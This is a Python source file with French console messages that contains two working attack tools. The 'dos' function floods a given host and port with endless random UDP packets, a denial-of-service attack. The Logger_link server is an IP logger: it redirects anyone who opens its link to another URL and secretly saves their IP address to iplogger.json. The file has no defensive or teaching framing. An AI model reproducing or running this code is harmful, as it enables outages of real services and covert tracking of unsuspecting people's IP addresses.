import socket
import threading
import json
import socket
import random
import colorama

def dos(ip, port) -> None:
    ip = socket.gethostbyname(ip)
    print(f"[{ip}:{port}] DDOS en cours...")
    target = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    target.connect((ip, port))
    while True:
        target.send(random._urandom(10**4))


class Logger_link(threading.Thread):
    def __init__(self, url: str, port: int, host: str) -> None:
        threading.Thread.__init__(self)
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.socket.bind(("", port))
        self.url = url
        self.port = port
        self.host = host
    
    def run(self) -> None:
        print(f"{colorama.Fore.LIGHTGREEN_EX}[Online] {colorama.Fore.WHITE}http://{self.host}:{self.port}/")
        while True:
            self.socket.listen(10)
            client, (ip, port) = self.socket.accept()
            threading.Thread(target=self.redirection, args=[client, ip]).start()
    
    def redirection(self, client: socket.socket, ip: str) -> None:
        data = client.recv(4096)
        client.send(f"HTTP/1.1 302 Found\r\nLocation: {self.url}\r\n\r\n".encode())
        client.close()
        url_info = IP_save(self.port, self.url)
        if not ip in url_info.info[url_info.index]["co"]:
            url_info.info[url_info.index]["co"].append(ip)
            url_info.save()

class BDD:
    def __init__(self) -> None:
        try: 
            with open("save.json", "r+") as file:
                self.info = json.load(file)
        except:
            self.info = {
                "port": [],
                "url": [],
            }
            with open("save.json", "w+") as file:
                json.dump(self.info, file, indent=2)

    def exist(self, port: int) -> bool:
        try:
            self.info["port"].index(port)
            return True
        except:
            return False

    def display(self) -> None:
        for nmb, port in enumerate(self.info["port"]):
            print(f"{port}: {self.info['url'][nmb]}")

    def add(self, port: int, url: str) -> None:
        self.info["port"].append(port)
        self.info["url"].append(url)
        self.save()

    def remove(self, port: int) -> None:
        slot = self.info["port"].index(port)
        self.info["port"].remove(port)
        self.info["url"].pop(slot)
        self.save()

    def save(self) -> None:
        with open("save.json", "w+") as file:
            json.dump(self.info, file, indent=2)

class IP_save:
    def __init__(self, port: int, link: str) -> None:
        self.index = None
        default = {
                    "port": port,
                    "link": link,
                    "co": []
                }
        try:
            with open(f"iplogger.json", "r+") as file:
                self.info = json.load(file)
                for index, i in enumerate(self.info):
                    if i["port"] == port and i["link"] == link:
                        self.index = index
                if self.index == None:
                    self.index = len(self.info)
                    self.info.append(default)
        except:
            self.info = [default]
            with open("iplogger.json", "w+") as file:
                json.dump([default], file, indent=2)
                

    def save(self) -> None:
        with open(f"iplogger.json", "w+") as file:
            json.dump(self.info, file, indent=2)